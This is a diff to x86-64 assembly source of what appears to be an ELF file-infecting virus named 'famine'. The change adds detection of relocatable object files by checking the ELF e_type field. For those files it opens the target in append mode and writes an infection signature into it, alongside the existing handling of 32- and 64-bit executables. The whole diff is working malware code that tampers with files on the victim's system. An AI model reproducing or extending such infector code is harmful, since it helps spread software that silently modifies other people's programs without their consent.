@@ -244,6 +244,8 @@ famine_file:
 	jne leave_famine_file
 	cmp byte[rax + 3], 'F'
 	jne leave_famine_file
+	cmp WORD[rax + 16], 2;e_type , 2 == ET_EXEC
+	jne obj_file
 	cmp byte[rax + 4], 2 ; ELFCLASS64 = 2, when handling 32bit changed the jmp
 	jne file32bit
 	;64BIT FILE
@@ -268,6 +270,17 @@ famine_file:
 	mov rsi, rax; wfd
 	mov rdx, [rsp + 12]; fsize
 	call parse32elf
+	jmp leave_famine_file
+	obj_file:
+	cmp WORD[rax + 16], 1; ET_REL
+	jne leave_famine_file
+	;Obj file handle
+	mov rdi, QWORD[rsp + 20]
+	call open_append
+	mov rdi, rax
+	call write_signature
+	mov rax, 3; close
+	syscall
 	; end parse MAGIC
 	
 	
@@ -295,6 +308,14 @@ retn
 
 open_file:
 	xor rsi, rsi
+	xor rdx, rdx
+	mov rax, 2
+	syscall
+retn
+
+
+open_append:
+	mov rsi, 1090
 	xor rdx, rdx
 	mov rax, 2
 	syscall
